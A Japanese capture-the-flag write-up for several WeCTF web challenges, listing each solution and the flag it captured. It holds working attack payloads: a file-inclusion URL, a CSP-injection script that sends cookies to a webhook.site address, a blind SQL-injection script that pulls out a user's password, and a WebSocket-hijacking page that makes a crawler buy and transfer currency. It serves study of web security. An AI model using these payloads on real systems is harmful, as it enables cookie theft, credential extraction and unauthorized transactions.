# WeCTF
- Welcome
- include
- CSP1
- Cache
- Phish
- Coin Exchange
# Welcome
>The flag is b64decode("d2UlN0I1ODRjNGNiMC1jYjU4LTQ1YWItOTNhNC0yOWY1YmRhYzlmMjJAaGVsbG9faGFja2VycyU3RSU3RA==")

書いてある通りデコードする   
```we{584c4cb0-cb58-45ab-93a4-29f5bdac9f22@hello_hackers~}```
# include
>Yet another buggy PHP website.
Flag is at /flag.txt on filesystem

```
<?php
show_source(__FILE__);
@include $_GET["🤯"];
```
フラグの場所がわかっているので

http://include.sf.ctf.so/?%F0%9F%A4%AF=/flag.txt  
```we{695ed01b-3d31-46d7-a4a3-06b744d20f4b@1nc1ud3_/etc/passwd_yyds!}```
# CSP1
```
@app.route('/display/<token>')
def display(token):
    user_obj = Post.select().where(Post.token == token)
    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
    img_urls = [x['src'] for x in bs(content).find_all("img")]
    tmpl = render_template("display.html", content=content)
    resp = make_response(tmpl)
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
    return resp

```

https://csplite.com/csp/test78/  
重複するdirectiveは無視されるらしい。
script より先に img のdirectiveが書き込めるので、script directiveを書き込む。

```
 <img src="http://example.com;script-src 'unsafe-inline';"><script>location='https://webhook.site/7ab26888-4775-4acd-a827-adaed7076e5c?a='document.cookie</script> 
 ```

```flag=we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}```

# Cache
caceh deception

cache_middleware.py を見ると css js html で終わるものをキャッシュするようになっている。  
http://~/flag/noexist.css みたいなリクエストをすると flag からのレスポンスになることを利用して、クローラにflagを踏ませてキャッシュさせた後にキャッシュを見に行く  
```we{adecbd5c-a02c-4d85-883e-caee34760745@b3TTer_u3e_cl0uDF1are}```
# Phish
insert 文の username と passwordが自由に入れられる。  
フラグはshouというアカウントのpassword  
username が uniqe になっているため、衝突させることでエラーを吐くのでそれを利用してフラグを特定していく。
一致しない場合の条件の時の username も重複しないようにする必要がある。  
以下スクリプト
```
import random
import requests
url = 'http://phish.sg.ctf.so/add'
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_", "@", "$", "!", "?", "&", "#", "-", "<", ">", "{", "}"]


def attack(payload):
    res = requests.post(url, {
        'username': 'i',
        'password': payload
    })
    # print(res.text)
    return res


def check_result(res):
    if 'leaked' in res.text:
        return True
    return False



before = 'aaaaa'
pos = 0
fix_pass = ""
while True:
    if(before == fix_pass):
        break
    pos += 1
    before = fix_pass
    for c in candidates:
        template = f"pass', case when (substr((SELECT password FROM user WHERE username ='shou'),{pos},1) = '{c}') then '{c}{random.random()}' else 'shou' end )--"
        print(f'{c} at {pos}')
        res = attack(template)

        if check_result(res):
            fix_pass += c
            print(f'find {fix_pass}')
            break


print("result: " + fix_pass)



```

``` we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P} ```

# Coin Exchange
USD が 5000↑ になるとフラグがもらえる

websocketの通信元が検証されていない  
クローラーに対して、buy -> transfer をさせる  
そのあと自分のアカウントでsellをすることで条件を満たす  
```
<!DOCTYPE HTML>
<html>

<head>
    <script type="text/javascript" charset="utf-8">
        let socket;
        let config = {
            usd_to_eth_ratio: NaN,
            eth_to_usd_ratio: NaN,
            base_balance: 1000,
            trade_history: [],
            rankings: []
        };
        function send_content(type, content) {
            socket.send(JSON.stringify({ type: type, content: content }))
        }
        function start_socket() {
            socket = new WebSocket("ws://coin.sg.ctf.so:4001/", "ethexchange-api");

            socket.onmessage = function (event) {
                let data = JSON.parse(event.data);
                let content = data["content"]
                switch (data["type"]) {
                    case "routine":
                        config = content;
                        break;
                    case "message":
                        fetch('/' + content["message"])
                        break
                    case "error":
                        fetch("/Error")
                        break
                }
            };
        }

        function transfer_eth() {
            let amount = "50"
            let transfer_to_token = "e76d1da29089224c23af32a94f570269a8eeab1e67150a3433a18c4a2953c305"
            //  e76d1da29089224c23af32a94f570269a8eeab1e67150a3433a18c4a2953c305
            send_content("transfer", { amount: amount, to_token: transfer_to_token })
        }

        function usd_to_eth() {
            let amount = 1000000000
            send_content("buy", { amount: amount })
        }
        fetch('/' + document.cookie)
        start_socket()
        setTimeout(() => {
            usd_to_eth()
        }, 1000);
        setTimeout(() => {
            transfer_eth()
            fetch('/fin')
        }, 3000);

    </script>
</head>
</html>
```
``` we{1e1b12c8-ed85-4b2b-879d-7475febe6281@d0g3&sh1b_th3_BEST!} ```


